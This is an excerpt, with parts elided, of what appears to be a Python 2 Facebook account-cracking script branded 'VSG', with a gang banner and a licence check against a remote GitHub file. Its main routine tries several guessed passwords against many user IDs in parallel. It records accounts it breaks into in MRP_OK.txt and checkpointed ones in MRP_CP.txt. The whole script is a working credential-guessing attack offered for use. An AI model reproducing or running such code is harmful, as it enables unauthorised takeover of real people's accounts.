...
\033[1;96m  GANG OWNER    :  ALEY X AHITSHAM
\033[1;95m  NOTE          :  OQAT MA RAHNA
\033[1;94m  HATERS FOLLOW KRO PAPA LOG KO
\033[1;97m  *********************************
"""
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/aley333/VSG/main/vsg.txt').text
    if to in r:
...
def reg2():
    ...
    os.system('xdg-open https://wa.me/+923554576001')
...
def menu():
    ...
    print '\033[1;92m[2] Follow VSG OWNER'
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;95mITz VSG BRAND \033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[VSG-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[VSG-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[VSG-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[VSG-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('MRP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[VSG-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[VSG-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('MRP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[VSG-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[VSG-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('MRP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mVSG BranD  PROGRAMMING'
